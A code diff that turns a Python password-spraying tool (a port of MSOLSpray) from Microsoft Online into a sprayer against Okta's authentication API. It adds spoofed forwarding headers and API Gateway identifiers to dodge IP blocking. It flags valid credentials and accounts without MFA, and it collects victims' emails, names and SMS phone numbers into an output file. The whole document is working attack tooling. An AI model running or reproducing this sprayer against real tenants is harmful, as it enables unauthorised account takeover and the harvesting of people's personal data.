@@ -5,22 +5,6 @@ from concurrent.futures import ThreadPoolExecutor
 import random
 import queue
 
-
-description = """
-This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him! Python port credits go to MartinIngesen (@Mrtn9)
-
-This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
-"""
-
-epilog = """
-EXAMPLE USAGE:
-This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
-    python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020
-
-This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
-    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
-"""
-
 q = queue.Queue()
 force = False
 lockout_counter = 0
@@ -34,8 +18,7 @@ def main():
 
     global force, username_count, useragents
 
-    parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
-
+    parser = argparse.ArgumentParser()
     parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
     parser.add_argument("-p", "--password", help="A single password that will be used to perform the password spray")
     parser.add_argument("-pf", "--passwordfile", help="File containing multiple passwords to spray, will spray one after they other if no delay is set")
@@ -44,24 +27,22 @@ def main():
     parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use. Will make throttle quicker if not used with FireProx")
     parser.add_argument("-d", "--delay", type=int, help="Number of minutes to wait between unique passwords, allows password lockout policy to reset")
     parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
-    parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
-
+    parser.add_argument("--url", required=True, help="The URL to spray against 'https://target.okta.com'. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
     args = parser.parse_args()
 
     url = args.url
     force = args.force
     out = args.out
-    verbose = args.verbose
     threads = args.threads
     delay = args.delay
 
     usernames = []
-    with open(args.userlist, "r") as userlist:
+    with open(args.userlist, 'r') as userlist:
         usernames = userlist.read().splitlines()
 
     username_count = len(usernames)
 
+    useragents = ["test useragent"]
     if args.useragentfile is not None:
         with open(args.useragentfile, 'r') as agentlist:
             useragents = agentlist.read().splitlines()
@@ -75,7 +56,7 @@ def main():
         exit()
 
     print(f"There are {username_count} users in total to spray,")
-    print("Now spraying Microsoft Online.")
+    print(f"Now spraying {url}.")
     print(f"Current date and time: {time.ctime()}")
 
     for password in passwords:
@@ -90,8 +71,7 @@ def main():
             for i in range(0,threads):
                 executor.submit(
                     spray_thread,
-                    url=url,
-                    verbose=verbose
+                    url=url
                 )
 
         if lockedout:
@@ -111,8 +91,7 @@ def main():
             out_file.write(results)
             print(f"Results have been written to {out}.")
 
-
-def spray_thread(url, verbose):
+def spray_thread(url):
 
     global username_counter, username_count, lockedout
 
@@ -127,11 +106,10 @@ def spray_thread(url, verbose):
 
         cred = q.get_nowait()
 
-        msol_authenticate(
+        okta_authenticate(
             username = cred['username'],
             password = cred['password'],
-            url = url,
-            verbose = verbose
+            url = url
         )
 
         q.task_done()
@@ -154,18 +132,17 @@ def generate_trace_id():
     return str + first + "-" + second
 
 
-def msol_authenticate(username, password, url, verbose):
+def okta_authenticate(username, password, url):
 
     global results, lockout_counter, useragents
 
     body = {
-        'resource': 'https://graph.windows.net',
-        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
-        'client_info': '1',
-        'grant_type': 'password',
-        'username': username,
-        'password': password,
-        'scope': 'openid',
+        "username":username,
+        "options": {
+            "warnBeforePasswordExpired":True,
+            "multiOptionalFactorEnroll":True
+        },
+        "password":password
     }
 
     spoofed_ip = generate_ip()
@@ -173,64 +150,64 @@ def msol_authenticate(username, password, url, verbose):
     trace_id = generate_trace_id()
 
     headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/x-www-form-urlencoded',
+        "Accept":"application/json",
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
-        "X-Amzn-Trace-Id" : trace_id
+        "X-Amzn-Trace-Id" : trace_id,
+        "X-Requested-With":"XMLHttpRequest",
+        "X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0",
+        "Accept-Encoding":"gzip, deflate",
+        "Accept-Language":"en",
+        "Content-Type":"application/json"
     }
 
     if useragents != []:
         headers['User-Agent'] = random.choice(useragents)
 
-    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
+    response = requests.post("{}/api/v1/authn".format(url), data=body, headers=headers)
 
-    if r.status_code == 200:
-        print(f"SUCCESS! Code: {r.status_code} {username} : {password}")
-        results += f"{username} : {password}\n"
-    else:
-        resp = r.json()
-        error = resp["error_description"]
+    if response.status_code == 200 and 'status' in response.json():
+        jsonData = response.json()
 
-        if "AADSTS50126" in error:
-            if verbose:
-                print(f"VERBOSE: Code: {r.status_code} Invalid username or password. Username: {username} could exist.")
-
-        elif "AADSTS50128" in error or "AADSTS50059" in error:
-            print(f"WARNING! Code: {r.status_code} Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
-
-        elif "AADSTS50034" in error:
-            print(f"WARNING! Code: {r.status_code} The user {username} doesn't exist.")
-
-        elif "AADSTS50079" in error or "AADSTS50076" in error:
-            # Microsoft MFA response
-            print(f"SUCCESS! Code: {r.status_code} {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-            results += f"{username} : {password}\n"
-
-        elif "AADSTS50158" in error:
-            # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
-            print(f"SUCCESS! Code: {r.status_code} {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-            results += f"{username} : {password}\n"
-
-        elif "AADSTS50053" in error:
-            # Locked out account or Smart Lockout in place
-            print(f"WARNING! Code: {r.status_code} The account {username} appears to be locked.")
+        if "LOCKED_OUT" == jsonData['status']:
+            print(f"Account locked out! {username}:{password}")
             lockout_counter += 1
 
-        elif "AADSTS50057" in error:
-            # Disabled account
-            print(f"WARNING! Code: {r.status_code} The account {username} appears to be disabled.")
+        elif "MFA_ENROLL" == jsonData['status']:
 
-        elif "AADSTS50055" in error:
-            # User password is expired
-            print(f"SUCCESS! Code: {r.status_code} {username} : {password} - NOTE: The user's password is expired.")
-            results += f"{username} : {password}\n"
+            print(f"Code: {response.status_code} Valid Credentials without MFA!{username}:{password}")
+
+            email = jsonData['_embedded']['user']['profile']['login']
+            fName = jsonData['_embedded']['user']['profile']['firstName']
+            lName = jsonData['_embedded']['user']['profile']['lastName']
+            phone = "N/A"
+
+            if 'factors' in jsonData['_embedded']:
+                for item in jsonData['_embedded']['factors']:
+                    if "factorType" in item.keys() and item['factorType']=='sms':
+                        phone = item['profile']['phoneNumber']
+            data = ", ".join([username, password,email, fName, lName, phone])
+            print(data)
+            results += data
 
         else:
-            # Unknown errors
-            print(f"Code: {r.status_code} Got an error we haven't seen yet for user {username}")
-            print(error)
 
+            print(f"Code: {response.status_code} Valid Credentials! {username}:{password}")
+
+            email = jsonData['_embedded']['user']['profile']['login']
+            fName = jsonData['_embedded']['user']['profile']['firstName']
+            lName = jsonData['_embedded']['user']['profile']['lastName']
+            phone = "N/A"
+
+            if 'factors' in jsonData['_embedded']:
+
+                for item in jsonData['_embedded']['factors']:
+                    if "factorType" in item.keys() and item['factorType']=='sms':
+                        phone = item['profile']['phoneNumber']
+            data = ", ".join([username, password,email, fName, lName, phone])
+            results += data
+    else:
+        print(f"FAILED: Code: {response.status_code} {username}:{password}")
 
 if __name__ == '__main__':
     main()
